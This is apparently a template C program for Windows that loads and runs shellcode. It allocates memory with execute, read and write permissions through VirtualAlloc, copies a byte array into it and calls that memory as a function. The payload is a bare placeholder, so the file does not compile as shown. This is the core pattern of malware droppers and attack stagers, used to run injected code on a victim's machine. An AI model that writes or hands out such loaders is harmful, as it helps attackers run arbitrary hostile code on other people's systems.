#include "windows.h"
#include "stdio.h"

unsigned char shellcode[] = shellcode

void main()
{
    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, shellcode, sizeof(shellcode));
    ((void(*)())Memory)();
}
